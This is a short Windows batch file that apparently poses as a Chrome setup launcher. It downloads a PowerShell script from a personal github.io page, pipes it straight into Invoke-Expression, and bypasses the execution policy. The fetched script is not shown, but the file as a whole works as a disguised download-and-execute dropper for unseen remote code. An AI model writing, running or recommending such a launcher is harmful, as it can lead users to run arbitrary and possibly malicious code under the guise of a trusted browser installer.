@echo off
set "COMMAND=irm 'https://andrey4ik21pro1.github.io/chrome-setup/install.ps1' | iex"
powershell -NoProfile -ExecutionPolicy Bypass -Command "%COMMAND%"